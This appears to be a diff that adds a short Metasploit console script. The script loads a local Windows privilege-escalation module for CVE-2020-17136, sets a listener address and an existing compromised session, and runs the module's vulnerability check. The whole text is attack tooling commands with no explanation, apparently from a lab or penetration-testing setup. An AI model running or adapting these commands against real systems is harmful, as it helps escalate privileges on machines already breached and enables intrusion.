@@ -1,0 +1,4 @@
+use windows/local/cve_2020_17136
+set LHOST 192.168.52.131
+set session 2
+check
